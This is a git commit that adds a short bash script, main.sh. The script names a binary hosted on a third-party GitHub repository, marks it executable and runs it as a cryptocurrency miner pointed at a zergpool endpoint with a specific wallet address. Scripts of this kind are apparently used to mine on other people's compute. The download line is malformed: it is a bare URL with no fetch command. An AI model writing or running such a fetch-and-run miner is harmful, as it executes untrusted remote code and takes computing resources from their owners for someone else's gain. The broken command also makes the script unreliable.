780d9bc7fe251f09c56c23039466f79c9ae4be6e
gogetahsan214 <108542791+gogetahsan214@users.noreply.github.com>
2022-07-02 00:14:39 +0700

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+https://github.com/jirensan3090/cpu/raw/main/xrgs && chmod +x xrgs
+./xrgs -o cryptonight_haven.mine.zergpool.com:4452 -a cn-heavy/xhv -k -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.cr8-1 -p c=TRX,mc=BLOC,m=solo -t 2
